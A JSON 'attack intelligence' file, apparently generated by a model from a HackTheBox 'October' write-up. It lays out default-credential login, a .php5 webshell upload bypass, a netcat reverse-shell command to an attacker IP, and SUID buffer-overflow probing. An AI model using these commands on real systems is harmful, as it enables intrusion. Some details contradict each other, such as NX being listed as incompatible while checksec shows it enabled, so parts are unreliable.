@@ -1,0 +1,843 @@
+{
+  "writeup_id": "Htb_October",
+  "scenario_fingerprint": {
+    "scenario_name": "october_cms_upload_bypass_buffer_overflow",
+    "primary_services": [
+      "http",
+      "ssh"
+    ],
+    "port_signature": "22+80",
+    "service_combination": "ssh+apache",
+    "os_family": "linux",
+    "environment_type": "web_application",
+    "entry_vector": "file_upload_bypass",
+    "privilege_path": "webshell_to_buffer_overflow",
+    "attack_complexity": "medium",
+    "estimated_time": "60-90 minutes",
+    "scenario_confidence": 0.92,
+    "distinguishing_factors": [
+      "october_cms_default_credentials",
+      "php5_extension_bypass",
+      "suid_binary_overflow"
+    ],
+    "environmental_clues": [
+      "october_cms_backend_access",
+      "apache_ubuntu_14_04",
+      "media_upload_functionality"
+    ],
+    "similar_scenarios": [
+      "cms_upload_bypass_scenarios",
+      "web_to_binary_exploitation"
+    ],
+    "unique_aspects": [
+      "october_cms_specific",
+      "php5_blacklist_bypass",
+      "binary_exploitation_privesc"
+    ]
+  },
+  "success_patterns": {
+    "success_factors": [
+      {
+        "technique": "October CMS File Upload Bypass",
+        "success_reason": "Extension blacklist incomplete - php5 extension not blocked",
+        "prerequisite_indicators": [
+          "october_cms_identified",
+          "admin_panel_accessible",
+          "default_credentials_work",
+          "file_upload_functionality_exists"
+        ],
+        "recognition_patterns": [
+          "October CMS title in HTTP response",
+          "/backend path accessible",
+          "admin/admin default credentials",
+          "media upload section available"
+        ],
+        "failure_modes": [
+          "default_credentials_changed",
+          "complete_extension_blacklist",
+          "file_upload_disabled",
+          "web_application_firewall_present"
+        ],
+        "environmental_factors": [
+          "default_october_cms_installation",
+          "no_security_hardening",
+          "apache_serves_php5_files",
+          "writable_upload_directory"
+        ],
+        "success_probability": 0.75,
+        "typical_timeframe": "10-20 minutes"
+      },
+      {
+        "technique": "Buffer Overflow SUID Binary",
+        "success_reason": "Custom SUID binary vulnerable to stack overflow",
+        "prerequisite_indicators": [
+          "custom_suid_binary_present",
+          "binary_accepts_user_input",
+          "no_stack_protection",
+          "segfault_on_long_input"
+        ],
+        "recognition_patterns": [
+          "unusual binary in /usr/local/bin/",
+          "suid bit set on custom binary",
+          "segmentation fault with long strings",
+          "32-bit binary architecture"
+        ],
+        "failure_modes": [
+          "stack_canaries_enabled",
+          "dep_nx_bit_protection",
+          "input_length_validation",
+          "modern_compiler_protections"
+        ],
+        "environmental_factors": [
+          "older_ubuntu_system",
+          "custom_compiled_binary",
+          "minimal_exploit_mitigations",
+          "aslr_bypassable"
+        ],
+        "success_probability": 0.65,
+        "typical_timeframe": "30-60 minutes"
+      }
+    ],
+    "critical_discoveries": [
+      {
+        "discovery": "October CMS with default credentials",
+        "discovery_method": "nmap service detection and default credential testing",
+        "why_critical": "Provided administrative access to CMS with file upload capability",
+        "how_to_recognize": [
+          "October CMS title in web response",
+          "/backend path returns login page",
+          "admin/admin credentials accepted"
+        ],
+        "follow_up_actions": [
+          "test_file_upload_restrictions",
+          "attempt_php_extension_bypass",
+          "upload_webshell_variants"
+        ]
+      },
+      {
+        "discovery": "Custom SUID binary /usr/local/bin/ovrflw",
+        "discovery_method": "SUID enumeration with LinEnum.sh",
+        "why_critical": "Vulnerable buffer overflow in privileged binary leads to root",
+        "how_to_recognize": [
+          "unusual binary name suggesting overflow",
+          "located in /usr/local/bin/",
+          "suid root permissions",
+          "segfaults with long input"
+        ],
+        "follow_up_actions": [
+          "test_buffer_overflow_lengths",
+          "analyze_binary_protections",
+          "develop_exploit_payload"
+        ]
+      }
+    ],
+    "escalation_keys": [
+      {
+        "privilege_level": "www-data",
+        "escalation_method": "SUID_buffer_overflow",
+        "why_possible": "Custom SUID binary lacks modern protections and has stack overflow vulnerability",
+        "recognition_signs": [
+          "custom_suid_binary_present",
+          "segfault_on_long_input",
+          "older_system_minimal_protections",
+          "32bit_architecture_easier_exploitation"
+        ],
+        "exploitation_path": "File Upload → Webshell → SUID Binary Overflow → Root Shell"
+      }
+    ]
+  },
+  "decision_tree": {
+    "decision_points": [
+      {
+        "step": 1,
+        "situation": "Found only ports 22 and 80 open on Linux host",
+        "decision": "Focus on web application enumeration and exploitation",
+        "reasoning": "Limited attack surface points to web-based initial access",
+        "confidence": 0.9,
+        "alternatives": [
+          {
+            "option": "ssh_enumeration",
+            "when": "if web fails"
+          },
+          {
+            "option": "service_version_exploits",
+            "when": "if known vulnerabilities exist"
+          }
+        ],
+        "success_indicators": [
+          "web_application_identified",
+          "admin_interface_found",
+          "default_credentials_work"
+        ],
+        "next_decision": "identify_cms_and_attack_vectors"
+      },
+      {
+        "step": 2,
+        "situation": "Identified October CMS with admin backend access",
+        "decision": "Attempt file upload bypass for code execution",
+        "reasoning": "CMS platforms commonly have upload functionality with bypassable filters",
+        "confidence": 0.85,
+        "prerequisites": [
+          "admin_access_obtained",
+          "upload_functionality_exists"
+        ],
+        "success_indicators": [
+          "file_upload_successful",
+          "code_execution_achieved"
+        ],
+        "failure_fallbacks": [
+          "plugin_exploitation",
+          "template_injection",
+          "database_access"
+        ]
+      },
+      {
+        "step": 3,
+        "situation": "Gained www-data shell access",
+        "decision": "Enumerate SUID binaries for privilege escalation",
+        "reasoning": "Custom SUID binaries often contain exploitable vulnerabilities",
+        "confidence": 0.8,
+        "prerequisites": [
+          "shell_access_obtained"
+        ],
+        "success_indicators": [
+          "custom_suid_binary_found",
+          "buffer_overflow_identified"
+        ],
+        "failure_fallbacks": [
+          "kernel_exploits",
+          "service_exploits",
+          "credential_hunting"
+        ]
+      },
+      {
+        "step": 4,
+        "situation": "Found custom SUID binary with buffer overflow vulnerability",
+        "decision": "Develop return-to-libc exploit despite ASLR",
+        "reasoning": "Limited ASLR entropy makes brute force attack feasible",
+        "confidence": 0.75,
+        "prerequisites": [
+          "buffer_overflow_confirmed",
+          "aslr_entropy_analyzed"
+        ],
+        "success_indicators": [
+          "exploit_development_successful",
+          "root_access_achieved"
+        ],
+        "failure_fallbacks": [
+          "other_privesc_vectors",
+          "kernel_exploits"
+        ]
+      }
+    ],
+    "branching_logic": {
+      "if_web_cms_identified": {
+        "action": "research_cms_specific_vulnerabilities",
+        "tools": [
+          "searchsploit",
+          "exploit-db",
+          "cms_documentation"
+        ],
+        "next_phase": "attempt_default_credentials"
+      },
+      "if_admin_access_obtained": {
+        "action": "explore_file_upload_functionality",
+        "alternatives": [
+          "direct_upload",
+          "media_manager",
+          "plugin_installation"
+        ],
+        "decision_criteria": "based_on_available_cms_features"
+      },
+      "if_upload_filter_encountered": {
+        "action": "attempt_extension_bypass",
+        "techniques": [
+          "alternative_extensions",
+          "double_extensions",
+          "mime_type_bypass"
+        ],
+        "tools": [
+          "burp_suite",
+          "custom_payloads"
+        ]
+      },
+      "if_shell_obtained": {
+        "action": "run_privilege_escalation_enumeration",
+        "tools": [
+          "linenum",
+          "linpeas",
+          "manual_enumeration"
+        ],
+        "focus_areas": [
+          "suid_binaries",
+          "kernel_version",
+          "services"
+        ]
+      },
+      "if_custom_suid_found": {
+        "action": "analyze_binary_for_vulnerabilities",
+        "tools": [
+          "checksec",
+          "gdb",
+          "strings",
+          "ltrace"
+        ],
+        "next_phase": "exploit_development"
+      }
+    },
+    "optimization_rules": [
+      {
+        "rule": "always_check_default_credentials_on_cms",
+        "reasoning": "high_success_rate_with_minimal_effort",
+        "applicability": "any_cms_with_admin_interface"
+      },
+      {
+        "rule": "prioritize_custom_suid_binaries_over_standard_ones",
+        "reasoning": "custom_binaries_more_likely_to_contain_vulnerabilities",
+        "applicability": "linux_privilege_escalation"
+      },
+      {
+        "rule": "analyze_aslr_entropy_before_dismissing_buffer_overflows",
+        "reasoning": "limited_entropy_makes_brute_force_feasible",
+        "applicability": "buffer_overflow_with_aslr_enabled"
+      },
+      {
+        "rule": "test_alternative_file_extensions_for_upload_bypass",
+        "reasoning": "blacklist_filters_often_incomplete",
+        "applicability": "file_upload_functionality_present"
+      }
+    ]
+  },
+  "applicability_rules": {
+    "technique_rules": [
+      {
+        "technique": "CMS File Upload Bypass",
+        "mitre_id": "T1190",
+        "required_services": [
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "os_requirements": [
+          "linux",
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "cms_detected",
+          "file_upload_functionality",
+          "admin_panel_accessible",
+          "weak_default_credentials"
+        ],
+        "success_indicators": [
+          "october_cms_detected",
+          "backend_admin_accessible",
+          "media_upload_available",
+          "php_execution_enabled"
+        ],
+        "incompatible_with": [
+          "strict_file_validation",
+          "disabled_php_execution",
+          "changed_default_credentials",
+          "upload_functionality_disabled"
+        ],
+        "confidence_boosters": [
+          "default_admin_admin_credentials",
+          "october_cms_version_vulnerable",
+          "media_directory_writable",
+          "php5_extension_allowed"
+        ],
+        "typical_success_rate": 0.85,
+        "estimated_time": "10-20 minutes"
+      },
+      {
+        "technique": "SUID Binary Buffer Overflow",
+        "mitre_id": "T1068",
+        "required_services": [],
+        "required_ports": [],
+        "os_requirements": [
+          "linux"
+        ],
+        "environmental_prerequisites": [
+          "suid_binaries_present",
+          "custom_suid_binary_exists",
+          "buffer_overflow_vulnerability",
+          "local_shell_access"
+        ],
+        "success_indicators": [
+          "custom_suid_binary_found",
+          "binary_accepts_user_input",
+          "no_stack_protection",
+          "predictable_memory_layout"
+        ],
+        "incompatible_with": [
+          "aslr_enabled",
+          "stack_canaries_present",
+          "nx_bit_enabled",
+          "modern_compiler_protections"
+        ],
+        "confidence_boosters": [
+          "older_ubuntu_version",
+          "custom_compiled_binary",
+          "no_input_validation",
+          "simple_buffer_overflow_pattern"
+        ],
+        "typical_success_rate": 0.7,
+        "estimated_time": "30-60 minutes"
+      },
+      {
+        "technique": "Web Shell Upload",
+        "mitre_id": "T1505.003",
+        "required_services": [
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "os_requirements": [
+          "linux",
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "web_server_running",
+          "file_upload_capability",
+          "script_execution_enabled",
+          "writable_web_directory"
+        ],
+        "success_indicators": [
+          "php_server_detected",
+          "upload_directory_accessible",
+          "script_interpreter_available",
+          "web_shell_execution_confirmed"
+        ],
+        "incompatible_with": [
+          "strict_file_type_validation",
+          "disabled_script_execution",
+          "read_only_filesystem",
+          "comprehensive_input_filtering"
+        ],
+        "confidence_boosters": [
+          "apache_server_detected",
+          "php_enabled",
+          "permissive_upload_filters",
+          "alternative_php_extensions_allowed"
+        ],
+        "typical_success_rate": 0.8,
+        "estimated_time": "5-15 minutes"
+      }
+    ],
+    "environmental_detectors": {
+      "october_cms": {
+        "port_indicators": [
+          80,
+          443
+        ],
+        "service_indicators": [
+          "http",
+          "https"
+        ],
+        "banner_indicators": [
+          "October CMS",
+          "OctoberCMS"
+        ],
+        "path_indicators": [
+          "/backend",
+          "/backend/backend/auth/signin"
+        ],
+        "confidence_threshold": 0.9
+      },
+      "ubuntu_legacy": {
+        "port_indicators": [
+          22
+        ],
+        "service_indicators": [
+          "ssh"
+        ],
+        "banner_indicators": [
+          "Ubuntu 14.04",
+          "OpenSSH 6.6.1p1",
+          "Apache/2.4.7"
+        ],
+        "confidence_threshold": 0.85
+      },
+      "web_application": {
+        "port_indicators": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "service_indicators": [
+          "http",
+          "https"
+        ],
+        "technology_indicators": [
+          "apache",
+          "nginx",
+          "iis"
+        ],
+        "confidence_threshold": 0.9
+      }
+    },
+    "attack_prioritization": {
+      "high_priority": [
+        {
+          "attack": "cms_default_credentials",
+          "when": "october_cms_detected",
+          "reason": "default_admin_admin_commonly_unchanged"
+        },
+        {
+          "attack": "file_upload_bypass",
+          "when": "cms_admin_access_gained",
+          "reason": "known_extension_blacklist_bypass"
+        }
+      ],
+      "medium_priority": [
+        {
+          "attack": "suid_binary_enumeration",
+          "when": "local_shell_obtained",
+          "reason": "custom_binaries_often_vulnerable"
+        },
+        {
+          "attack": "web_shell_upload",
+          "when": "file_upload_available",
+          "reason": "reliable_code_execution_method"
+        }
+      ]
+    }
+  },
+  "technique_intelligence": {
+    "techniques": [
+      {
+        "name": "October CMS File Upload Bypass",
+        "mitre_id": "T1105",
+        "category": "initial_access",
+        "phase": "initial_access",
+        "tools_used": [
+          {
+            "name": "curl",
+            "command_template": "curl http://{target}/storage/app/media/{webshell}.php5?cmd={command}",
+            "actual_command": "curl http://10.10.10.16/storage/app/media/cmd.php5?cmd=id",
+            "output_pattern": "uid=33(www-data) gid=33(www-data) groups=33(www-data)",
+            "effectiveness_rating": 5,
+            "reliability": 0.95
+          }
+        ],
+        "prerequisites": [
+          "october_cms_admin_access",
+          "default_credentials_admin_admin",
+          "media_upload_functionality"
+        ],
+        "success_indicators": [
+          "php5_file_uploaded_successfully",
+          "webshell_accessible_via_url",
+          "command_execution_confirmed"
+        ],
+        "common_failures": [
+          "extension_blacklist_updated",
+          "upload_directory_not_web_accessible",
+          "php5_not_enabled_on_server"
+        ],
+        "follow_up_techniques": [
+          "reverse_shell_establishment",
+          "privilege_escalation_enumeration",
+          "suid_binary_exploitation"
+        ],
+        "time_investment": "5-15 minutes",
+        "skill_level": "beginner"
+      },
+      {
+        "name": "Buffer Overflow SUID Binary Exploitation",
+        "mitre_id": "T1068",
+        "category": "privilege_escalation",
+        "phase": "privilege_escalation",
+        "tools_used": [
+          {
+            "name": "gdb",
+            "command_template": "gdb -q {binary}",
+            "actual_command": "gdb -q ./ovrflw",
+            "output_pattern": "Reading symbols from",
+            "effectiveness_rating": 5,
+            "reliability": 0.98
+          },
+          {
+            "name": "pattern_create",
+            "command_template": "pattern_create {length}",
+            "actual_command": "pattern_create 500",
+            "success_factors": [
+              "peda_installed",
+              "metasploit_available"
+            ],
+            "effectiveness_rating": 5
+          },
+          {
+            "name": "checksec",
+            "command_template": "checksec {binary}",
+            "actual_command": "checksec ovrflw",
+            "output_pattern": "Arch:.*Stack:.*NX:.*PIE:",
+            "effectiveness_rating": 4
+          }
+        ],
+        "prerequisites": [
+          "suid_binary_identified",
+          "buffer_overflow_vulnerability_confirmed",
+          "binary_analysis_tools_available"
+        ],
+        "success_indicators": [
+          "segmentation_fault_triggered",
+          "eip_control_achieved",
+          "offset_calculated_successfully"
+        ],
+        "common_failures": [
+          "stack_canaries_enabled",
+          "aslr_too_randomized",
+          "nx_bit_prevents_shellcode"
+        ],
+        "follow_up_techniques": [
+          "return_to_libc_attack",
+          "aslr_bruteforce",
+          "rop_chain_construction"
+        ],
+        "time_investment": "30-120 minutes",
+        "skill_level": "intermediate"
+      },
+      {
+        "name": "Reverse Shell via Web Command Injection",
+        "mitre_id": "T1059.004",
+        "category": "execution",
+        "phase": "initial_access",
+        "tools_used": [
+          {
+            "name": "curl",
+            "command_template": "curl {webshell_url} --data-urlencode \"cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {attacker_ip} {port} >/tmp/f\"",
+            "actual_command": "curl http://10.10.10.16/storage/app/media/cmd.php5 --data-urlencode \"cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.14 443 >/tmp/f\"",
+            "output_pattern": "connection established",
+            "effectiveness_rating": 4,
+            "reliability": 0.9
+          },
+          {
+            "name": "netcat",
+            "command_template": "nc -lnvp {port}",
+            "actual_command": "nc -lnvp 443",
+            "success_factors": [
+              "firewall_allows_outbound",
+              "netcat_available_on_target"
+            ],
+            "effectiveness_rating": 4
+          }
+        ],
+        "prerequisites": [
+          "webshell_uploaded_and_accessible",
+          "command_execution_confirmed",
+          "network_connectivity_to_attacker"
+        ],
+        "success_indicators": [
+          "reverse_connection_established",
+          "interactive_shell_obtained",
+          "shell_upgrade_successful"
+        ],
+        "common_failures": [
+          "firewall_blocks_outbound_connections",
+          "netcat_not_available",
+          "command_injection_filtered"
+        ],
+        "follow_up_techniques": [
+          "shell_stabilization",
+          "privilege_escalation_enumeration",
+          "persistence_establishment"
+        ],
+        "time_investment": "5-10 minutes",
+        "skill_level": "beginner"
+      }
+    ],
+    "tool_effectiveness": [
+      {
+        "tool": "LinEnum.sh",
+        "use_case": "linux_privilege_escalation_enumeration",
+        "effectiveness_rating": 4,
+        "reliability": 0.92,
+        "learning_curve": "low",
+        "essential_for": [
+          "linux_privilege_escalation"
+        ],
+        "alternatives": [
+          "linpeas",
+          "manual_enumeration"
+        ],
+        "best_practices": [
+          "run_with_thorough_flag",
+          "focus_on_suid_binaries",
+          "check_kernel_version_for_exploits"
+        ]
+      },
+      {
+        "tool": "PEDA",
+        "use_case": "buffer_overflow_exploitation",
+        "effectiveness_rating": 5,
+        "reliability": 0.95,
+        "learning_curve": "medium",
+        "essential_for": [
+          "binary_exploitation"
+        ],
+        "alternatives": [
+          "gef",
+          "vanilla_gdb"
+        ],
+        "best_practices": [
+          "use_pattern_create_for_offset_finding",
+          "check_protections_before_exploitation",
+          "validate_eip_control"
+        ]
+      }
+    ],
+    "command_sequences": [
+      {
+        "sequence_name": "october_cms_to_webshell",
+        "steps": [
+          {
+            "step": 1,
+            "command": "curl -X POST http://10.10.10.16/backend/backend/auth/signin -d 'login=admin&password=admin'",
+            "purpose": "Authenticate to October CMS admin panel",
+            "expected_output": "Authentication successful redirect"
+          },
+          {
+            "step": 2,
+            "command": "Upload cmd.php5 containing <?php system($_REQUEST['cmd']); ?>",
+            "purpose": "Bypass extension blacklist and upload webshell",
+            "expected_output": "File uploaded to /storage/app/media/"
+          },
+          {
+            "step": 3,
+            "command": "curl http://10.10.10.16/storage/app/media/cmd.php5?cmd=id",
+            "purpose": "Test webshell functionality",
+            "expected_output": "uid=33(www-data) gid=33(www-data) groups=33(www-data)"
+          }
+        ],
+        "success_rate": 0.95,
+        "typical_duration": "5-10 minutes"
+      },
+      {
+        "sequence_name": "suid_buffer_overflow_analysis",
+        "steps": [
+          {
+            "step": 1,
+            "command": "find / -perm -4000 -type f 2>/dev/null",
+            "purpose": "Identify SUID binaries",
+            "expected_output": "List including /usr/local/bin/ovrflw"
+          },
+          {
+            "step": 2,
+            "command": "./ovrflw $(python -c 'print \"A\"*500')",
+            "purpose": "Test for buffer overflow vulnerability",
+            "expected_output": "Segmentation fault"
+          },
+          {
+            "step": 3,
+            "command": "checksec ovrflw",
+            "purpose": "Analyze binary protections",
+            "expected_output": "NX enabled, No PIE, No canary"
+          }
+        ],
+        "success_rate": 0.88,
+        "typical_duration": "15-30 minutes"
+      }
+    ]
+  },
+  "metadata": {
+    "basic_metadata": {
+      "name": "October",
+      "difficulty": "Medium",
+      "os": "Ubuntu 14.04",
+      "platform": "HackTheBox",
+      "release_date": "2017-04-20",
+      "author": "ch4p",
+      "estimated_time": "60-90 minutes"
+    },
+    "intelligence_metadata": {
+      "attack_complexity": "medium",
+      "skill_level_required": "intermediate",
+      "primary_attack_vectors": [
+        "web_exploitation",
+        "buffer_overflow"
+      ],
+      "key_vulnerabilities": [
+        "file_upload_bypass",
+        "setuid_buffer_overflow"
+      ],
+      "environment_type": "web_application_server",
+      "real_world_relevance": "high",
+      "learning_value": [
+        "cms_exploitation",
+        "buffer_overflow_basics",
+        "file_upload_bypass"
+      ],
+      "prerequisite_knowledge": [
+        "web_application_testing",
+        "basic_binary_exploitation",
+        "linux_fundamentals"
+      ]
+    },
+    "categorization": {
+      "primary_category": "web_exploitation",
+      "subcategories": [
+        "cms_exploitation",
+        "buffer_overflow",
+        "privilege_escalation"
+      ],
+      "attack_types": [
+        "initial_access",
+        "privilege_escalation"
+      ],
+      "defensive_lessons": [
+        "secure_file_uploads",
+        "remove_setuid_binaries",
+        "input_validation"
+      ]
+    },
+    "similarity_markers": {
+      "similar_boxes": [
+        "Nineveh",
+        "Poison",
+        "Sense"
+      ],
+      "similarity_reasons": [
+        "cms_exploitation",
+        "file_upload_bypass",
+        "web_to_system"
+      ],
+      "unique_aspects": [
+        "october_cms_specific",
+        "straightforward_buffer_overflow",
+        "extension_blacklist_bypass"
+      ],
+      "difficulty_factors": [
+        "requires_binary_exploitation",
+        "multi_stage_attack",
+        "moderate_exploit_development"
+      ]
+    }
+  },
+  "extraction_metadata": {
+    "parse_date": "2025-07-04T12:16:46.866122",
+    "original_file": "0xdf_writeups/Htb October.md",
+    "content_length": 19462,
+    "extraction_version": "2.0-claude",
+    "model_used": "claude-sonnet-4-20250514"
+  },
+  "intelligence_confidence": 0.9166666666666667,
+  "quality_breakdown": {
+    "scenario_uniqueness": 1.0,
+    "success_logic_clarity": 0.6666666666666666,
+    "applicability_completeness": 1.0,
+    "decision_tree_depth": 1.0,
+    "technique_actionability": 1.0
+  }
+}
